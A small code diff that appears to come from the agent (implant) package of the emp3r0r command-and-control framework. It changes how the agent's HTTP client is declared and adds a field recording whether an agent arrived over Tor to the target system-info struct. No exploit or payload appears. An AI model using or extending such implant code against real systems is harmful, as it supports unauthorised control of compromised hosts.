@@ -2,9 +2,9 @@ package agent
 
 import (
 	"context"
+	"net/http"
 	"os"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/tun"
 	"github.com/posener/h2conn"
 	"github.com/txthinking/socks5"
 )
@@ -14,7 +14,7 @@ var (
 	AgentRoot, _ = os.Getwd()
 
 	// HTTPClient handles agent's http communication
-	HTTPClient = tun.EmpHTTPClient()
+	HTTPClient *http.Client
 
 	// H2Json the connection to CC, for JSON message-based communication
 	H2Json *h2conn.Conn
@@ -62,6 +62,7 @@ type SystemInfo struct {
 	IP        string   // public IP of the target
 	IPs       []string // IPs that are found on target's NICs
 	HasRoot   bool     // is agent run as root?
+	HasTor    bool     // is agent from Tor?
 }
 
 // MsgTunData data to send in the tunnel
